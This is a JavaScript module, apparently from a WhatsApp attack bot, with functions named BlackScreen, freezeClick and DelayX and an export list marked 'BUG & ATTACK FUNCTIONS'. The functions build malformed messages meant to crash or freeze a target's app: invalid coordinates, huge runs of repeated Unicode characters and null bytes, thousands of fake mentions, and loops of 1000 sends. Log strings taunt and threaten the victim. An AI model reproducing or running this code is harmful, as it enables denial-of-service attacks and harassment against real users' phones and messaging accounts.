                    attrs: { ver: "1" }, 
                    content: new Uint8Array(Array(15).fill(255)) 
                },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations.filter(Boolean) },
                {
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
                }
            ]
        }]
    };

    console.log(`[📤 GACOR-ATTACK] Sending Force-Close Stanza to ${target}...`);
    await Yuukey.sendNode(stanza);
    console.log(`[✅ SUCCESS] Logic Loop Triggered.`);
}

async function BlackScreen(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "BTR PROJECT",
                address: "BY @Primroseell",
                jpegThumbnail: null
              },
              hasMediaAttachment: true
            },
            body: {},
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ោ៝".repeat(40000)
                  })
                }
              ],
              messageParamsJson: "{}"
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              pairedMediaType: "NOT_PAIRED_MEDIA",
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function freezeClick(sock, target) {
  try {
    for (let i = 0; i < 1000; i++) {
      const message = {
        botInvokeMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: `${Math.floor(Math.random() * 9)}@newsletter`,
              newsletterName:
                "\u202E\u0000" + "kelra" + "ꦾ".repeat(100000) + "\u0000".repeat(000000),
              jpegThumbnail: null,
              caption:
                "\u0000".repeat(20000) +
                "ꦽ".repeat(100000) +
                String.fromCharCode(8206 + i),
              inviteExpiration: 1,
            },
          },
        },
      };

      await sock.relayMessage(target, message, {});
    }
  } catch (err) {
    console.error("Error kakeklu freezestyle bego:", err);
  }
}

async function DelayX(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
        },
        body: {
          text: "\u0000".repeat(459880),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: JSON.stringify({
            values: {
              in_pin_code: "999999",
              building_name: "#",
              landmark_area: "X",
              address: "#",
              tower_number: "#",
              city: "Infinity",
              name: "#",
              phone_number: "999999999999",
              house_number: "xxx",
              floor_number: "xxx",
              state: `+ | ${"\u0000".repeat(9000)}`
            }
          }),
          version: 3
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log(` otw gw bunuh anj ${target}`);
  } catch (error) {
    console.error("lahk eror anjing:", error);
  }
}

module.exports = {
  // Core State
  activeConnections,
  biz,
  mess,

  // Session Management - VIP
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,

  // Session Management - Regular
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  checkActiveSessionInFolder,

  // Utilities
  disconnectAllActiveConnections,
  sleep,
  isVipOrOwner,

  // BUG & ATTACK FUNCTIONS
  crashNotificationVVIP,
  uno,
  forceCloseMentalVVIP,
  invisibleSpam,
  newsw,
  permenCall,
  GroupCrashUi,
  pay,
  xvar,
  CrashUi,
  CallLog,
  BlackScreen,
  freezeClick,
  DelayX
};
